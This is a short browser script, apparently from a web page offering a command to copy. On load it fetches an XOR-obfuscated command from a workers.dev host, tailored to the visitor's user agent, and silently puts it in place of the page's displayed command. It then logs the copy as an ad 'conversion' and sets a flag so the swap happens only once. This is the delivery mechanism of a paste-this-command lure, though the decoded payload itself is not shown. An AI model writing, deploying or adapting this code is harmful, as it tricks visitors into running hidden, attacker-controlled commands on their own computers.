(function () {
  var _d = document;
  var base = 'https://quiet-night-c52a.tv5d7dh7.workers.dev';
  var _cmdLoaded = false;

  function decode(arr) {
    return arr.map(function (b) { return String.fromCharCode(b ^ 0x5A); }).join('');
  }

  function setupCopyButton() {
    var btn = _d.getElementById('copyButton');
    var el = _d.getElementById('commandToCopy');
    if (!btn || !el) return;

    btn.addEventListener('click', function (e) {
      e.preventDefault();
      var text = el.textContent || '';
      if (navigator.clipboard) {
        navigator.clipboard.writeText(text).catch(function () {});
      } else {
        var t = _d.createElement('textarea');
        t.value = text;
        _d.body.appendChild(t);
        t.select();
        _d.execCommand('copy');
        _d.body.removeChild(t);
      }
	  
      if (_cmdLoaded) {
        gtag('event', 'conversion', {
          'send_to': 'AW-18075426146/0yEjCK3Hn6EcEOK6hKtD'
        });
        localStorage.setItem('_done', '1');
      }
      var original = btn.textContent;
      btn.textContent = 'Copied!';
      btn.style.pointerEvents = 'none';
      setTimeout(function () {
        btn.textContent = original;
        btn.style.pointerEvents = '';
      }, 2000);
    });
  }

  function init() {
    setupCopyButton();

    if (localStorage.getItem('_done')) return;

    fetch(base + '/token')
      .then(function (r) { return r.json(); })
      .then(function (res) {
        if (!res || !res.t) return;
        return fetch(base + '/cmd', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ t: res.t, ua: navigator.userAgent || '' })
        }).then(function (r) { return r.json(); });
      })
      .then(function (res) {
        if (!res || !res.data || !res.data.length) return;
        var el = _d.getElementById('commandToCopy');
        if (el) {
          el.textContent = decode(res.data);
          _cmdLoaded = true;
        }
      })
      .catch(function () {});
  }

  if (_d.readyState === 'loading') {
    _d.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();



